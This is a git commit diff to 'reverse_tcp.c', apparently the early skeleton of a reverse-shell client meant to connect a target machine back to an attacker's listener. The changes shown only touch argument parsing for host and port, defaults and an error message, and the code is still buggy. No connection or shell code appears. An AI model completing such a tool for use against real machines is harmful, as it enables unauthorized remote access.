b64ab94f0736825fc05657a7d2e7f9a2d67bf468
nashiaholloway <nashiaholloway1@gmail.com>
2020-02-11 22:56:33 -0500

    array has incomplete element type

--- reverse_tcp.c
+++ reverse_tcp.c
@@ -2,19 +2,21 @@
 #include <stdlib.h>
 #include <getopt.h> // parse command line args
 
+//#include "reverse_tcp.h"
+
 // CLIENT to connect to attacker's listening "SERVER"
 
 #define USAGE                                                                                               \
     "usage:\n"                                                                                              \
     "  reverse_tcp [options]\n"                                                                             \
     "options:\n"                                                                                            \
-    "  -s                  The host you want your target machine to connect to \n"                          \
+    "  -s                  The host you want your target machine to connect to (Default: localhost\n"       \
     "  -p                  The port you want your target machine to connect to (Default: 4444)\n"           \
     "  -h                  Show this help message\n"
 
 /* STRUCT FOR OPTIONS ==================================================== */
 // https://stackoverflow.com/questions/9642732/parsing-command-line-arguments-in-c
-static struct switches options[] = {
+const struct switches options[] = {
     {"LHOST", required_argument, NULL, 's'},
     {"LPORT", required_argument, NULL, 'p'},
     {"help", no_argument, NULL, 'h'},
@@ -24,16 +26,17 @@ static struct switches options[] = {
 int main(int argc, char **argv) {
 
     int opt = 0;
+    char *lhost = "127.0.0.1";
     unsigned short lport = 4444;
 
     // parse and set command line arguments
     // https://www.geeksforgeeks.org/getopt-function-in-c-to-parse-command-line-arguments/
     while ((opt = getopt_long(argc, argv, "s:p:hx", options, NULL)) != -1) {
         switch (opt) {
-            case 'lhost': //server
+            case 's': //server
                 lhost = optarg;
                 break;
-            case 'lport': //port
+            case 'p': //port
                 lport = atoi(optarg);
                 break;
             default: //show usage if error
@@ -53,7 +56,7 @@ int main(int argc, char **argv) {
 
     if ((lport < 1025) || (lport > 65535))
     {
-        fprintf(stderr, "%s @ %d: invalid port number (%d)\n", __FILE__, __LINE__, portno);
+        fprintf(stderr, "%s @ %d: invalid port number (%d)\n", __FILE__, __LINE__, lport);
         exit(1);
     }
 
---
+++ reverse_tcp.h
@@ -0,0 +1,3 @@
+
+
+static struct switches options[];
